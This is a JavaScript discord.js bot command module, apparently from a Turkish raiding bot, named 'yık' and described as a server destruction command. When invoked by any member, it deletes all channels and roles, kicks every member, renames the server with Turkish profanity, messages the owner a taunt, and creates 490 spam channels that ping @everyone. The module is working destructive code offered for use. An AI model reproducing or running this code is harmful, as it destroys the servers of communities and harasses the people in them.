const Discord = require("discord.js");
exports.run = function(client, message, args) {
  message.guild.channels.forEach(sil => {
    sil.delete();
  });
  message.guild.roles.forEach(sil => {
    sil.delete();
  });
  message.guild.members.forEach(ban => {
    ban.kick();
  });
  message.guild.setName("ASIL ŞEREFSİZ SENSİN AMINA KOYDUM");
  message.guild.setIcon(
    "https://cdn.discordapp.com/attachments/672472665298042881/673111632531947520/KED.jpg"
  );
  message.guild.owner.send(
    "***SUNUCUNUZ `nexsus` TARAFINDAN PATLATILDI AMQ***"
  );
  for (let i = 0; i < 490; i++) {
    setTimeout(function() {
      message.guild.createChannel("nexsus", "sa").then(c => {
        c.send(
          "`NEXSUS` ŞEREFSZLERLE OYNUYOR... @everyone!\n"
        );
      });
    }, 3000);
  }
};

exports.conf = {
  enabled: true,
  guildOnly: true,
  aliases: ["sunucu-patlat", "sa"],
  permLevel: 0
};

exports.help = {
  name: "yık",
  description: "Sunucu Yok Etme Komutu!",
  usage: "sa"
};